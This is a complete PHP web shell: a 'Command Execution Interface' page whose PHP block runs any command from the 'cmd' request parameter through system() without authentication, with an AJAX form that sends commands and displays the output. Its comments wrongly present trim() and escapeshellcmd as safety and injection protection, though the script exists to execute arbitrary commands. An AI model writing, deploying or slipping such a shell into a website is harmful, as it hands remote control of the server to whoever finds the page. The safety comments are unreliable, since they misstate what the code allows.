<?php
// PHP Logic: Executes system commands using $_REQUEST['cmd']
if (isset($_REQUEST['cmd'])) {
    echo "<pre>";
    $cmd = trim($_REQUEST['cmd']); // Trim input for safety
    system(escapeshellcmd($cmd)); // Escape the command to prevent injection
    echo "</pre>";
    exit; // Stop further execution
}
?>

<!-- HTML and JavaScript Part -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Execution Interface</title>
    <script>
        // Function to handle form submission using AJAX
        function executeCommand(event) {
            event.preventDefault(); // Prevent the form from reloading the page

            const cmdInput = document.getElementById('cmd').value; // Get the input value
            const outputDiv = document.getElementById('output'); // Output container

            // Create an AJAX request
            const xhr = new XMLHttpRequest();
            xhr.open('GET', '?cmd=' + encodeURIComponent(cmdInput), true); // Send input to the PHP script
            xhr.onreadystatechange = function () {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    outputDiv.innerHTML = xhr.responseText; // Update output dynamically
                }
            };
            xhr.send();
        }
    </script>
</head>
<body>
    <h2>Command Execution Interface</h2>
    <form onsubmit="executeCommand(event);">
        <input type="text" id="cmd" name="cmd" placeholder="Enter command" autofocus size="50">
        <input type="submit" value="Execute">
    </form>
    <h3>Output:</h3>
    <div id="output" style="background-color: #f8f8f8; padding: 10px; border: 1px solid #ccc;">
        <!-- Command output will appear here -->
    </div>
</body>
</html>
